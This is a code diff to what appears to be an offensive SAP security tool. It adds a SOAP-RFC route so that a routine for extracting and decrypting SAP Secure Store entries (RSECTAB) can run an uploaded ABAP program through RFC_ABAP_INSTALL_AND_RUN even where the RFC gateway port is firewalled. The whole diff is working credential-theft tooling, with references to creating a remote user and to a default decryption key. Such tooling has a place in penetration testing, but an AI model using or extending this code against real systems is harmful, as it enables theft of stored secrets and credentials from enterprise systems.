@@ -966,7 +966,7 @@ def _ensure_user_in_client(node, current_creds, target_client, state=None):
 # ---------------------------------------------------------------------------
 
 def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
-                         state=None) -> list:
+                         state=None, soap_session=None) -> list:
     """
     Read and decrypt SAP Secure Store entries.
 
@@ -978,6 +978,12 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
 
     The SSFS key file is always read (if available) to support systems that use
     an individual encryption key instead of the default.
+
+    Phase 3b: when ``soap_session`` is supplied (caller resolved a
+    SOAP-RFC route to this node because the gateway is firewalled),
+    the RSECTAB-via-ABAP step routes through it.  Step 1 (SSFS files
+    via OS exec) and step 3 (RFC_READ_TABLE) already have separate
+    SOAP paths via SXPG / RFC_READ_TABLE over SOAP elsewhere.
     """
     _require_crypto()
 
@@ -1032,7 +1038,8 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
 
     # --- Step 2: Read RSECTAB (the actual secure store entries) ---
     print(f"[*] SecStore {node.sid}: reading RSECTAB entries...")
-    rows = _read_rsectab_via_abap(node, creds)
+    rows = _read_rsectab_via_abap(
+        node, creds, soap_session=soap_session)
 
     if rows is None:
         abap_blocked = True
@@ -1089,7 +1096,8 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
                 # Retry RSECTAB with alternative client
                 print(f"[*] {node.sid}: Retrying RSECTAB read via "
                       f"client {alt_client}...")
-                rows = _read_rsectab_via_abap(node, alt_creds)
+                rows = _read_rsectab_via_abap(
+                    node, alt_creds, soap_session=soap_session)
                 if rows:
                     print(f"[+] {node.sid}: SecStore read succeeded via "
                           f"client {alt_client}")
@@ -1127,54 +1135,70 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
     return results
 
 
-def _read_rsectab_via_abap(node, creds) -> list | None:
+def _read_rsectab_via_abap(node, creds,
+                            soap_session=None) -> list | None:
     """Read RSECTAB via RFC_ABAP_INSTALL_AND_RUN.
+
+    When ``soap_session`` is supplied AND the gateway port is
+    unreachable, runs the ABAP program over SOAP-RFC instead of pyrfc.
+    Lets SecStore extraction work on HTTP-only ABAP targets (W74 et al.
+    with 33NN firewalled) — without this, _auto_download_secstore_async
+    after Create Remote User silently times out on every chunked
+    INSTALL_AND_RUN attempt.
 
     Returns list of (ident, data_hex) tuples, or None if the FM is not
     available.
     """
     try:
-        with sapmap_rfc._get_connection(node, creds) as conn:
-            res = sapmap_rfc._run_abap_program(conn, _ABAP_READ_RSECTAB,
-                                                "ZSECSTORE")
-            if not res.get("success") and "not available" in (res.get("error") or ""):
-                return None  # FM not available — caller will fall back
+        if soap_session is not None:
+            # SOAP path — bypass pyrfc + create_tcpip_destination
+            # + the gateway-port retry storm.
+            res = soap_session.install_and_run(
+                _ABAP_READ_RSECTAB, "ZSECSTORE")
+        else:
+            with sapmap_rfc._get_connection(node, creds) as conn:
+                res = sapmap_rfc._run_abap_program(
+                    conn, _ABAP_READ_RSECTAB, "ZSECSTORE")
 
-            if not res.get("success"):
-                print(f"[-] {node.sid} client {creds.client}: "
-                      f"SecStore ABAP exec error: {res.get('error')}")
-                return None
+        if not res.get("success") and "not available" in (res.get("error") or ""):
+            return None  # FM not available — caller will fall back
 
-            output = res.get("output", [])
-            print(f"[*] SecStore ABAP output: {len(output)} lines")
-            if output:
-                # Show first few lines for diagnostics
-                for i, line in enumerate(output[:3]):
-                    print(f"    line {i}: {line[:120]}{'...' if len(line) > 120 else ''}")
+        if not res.get("success"):
+            client_label = creds.client if creds else "?"
+            print(f"[-] {node.sid} client {client_label}: "
+                  f"SecStore ABAP exec error: {res.get('error')}")
+            return None
 
-            # Parse 3-line groups: ~~~I (ident), ~~~A (hex part1), ~~~B (hex part2)
-            rows = []
-            cur_ident = None
-            cur_hex   = ""
-            for line in output:
-                if line.startswith("~~~TOTAL:"):
-                    total = line.split(":", 1)[1].strip()
-                    print(f"[*] SecStore ABAP: {total} rows in RSECTAB")
-                    continue
-                if line.startswith("~~~I"):
-                    # Flush previous entry
-                    if cur_ident is not None and cur_hex:
-                        rows.append((cur_ident, cur_hex.replace(" ", "").upper()))
-                    cur_ident = line[4:].strip()
-                    cur_hex   = ""
-                elif line.startswith("~~~A"):
-                    cur_hex = line[4:].strip()
-                elif line.startswith("~~~B"):
-                    cur_hex += line[4:].strip()
-            # Flush last entry
-            if cur_ident is not None and cur_hex:
-                rows.append((cur_ident, cur_hex.replace(" ", "").upper()))
-            return rows
+        output = res.get("output", [])
+        print(f"[*] SecStore ABAP output: {len(output)} lines")
+        if output:
+            # Show first few lines for diagnostics
+            for i, line in enumerate(output[:3]):
+                print(f"    line {i}: {line[:120]}{'...' if len(line) > 120 else ''}")
+
+        # Parse 3-line groups: ~~~I (ident), ~~~A (hex part1), ~~~B (hex part2)
+        rows = []
+        cur_ident = None
+        cur_hex   = ""
+        for line in output:
+            if line.startswith("~~~TOTAL:"):
+                total = line.split(":", 1)[1].strip()
+                print(f"[*] SecStore ABAP: {total} rows in RSECTAB")
+                continue
+            if line.startswith("~~~I"):
+                # Flush previous entry
+                if cur_ident is not None and cur_hex:
+                    rows.append((cur_ident, cur_hex.replace(" ", "").upper()))
+                cur_ident = line[4:].strip()
+                cur_hex   = ""
+            elif line.startswith("~~~A"):
+                cur_hex = line[4:].strip()
+            elif line.startswith("~~~B"):
+                cur_hex += line[4:].strip()
+        # Flush last entry
+        if cur_ident is not None and cur_hex:
+            rows.append((cur_ident, cur_hex.replace(" ", "").upper()))
+        return rows
 
     except Exception as e:
         print(f"[-] SecStore ABAP read failed: {format_rfc_exception(e)}")
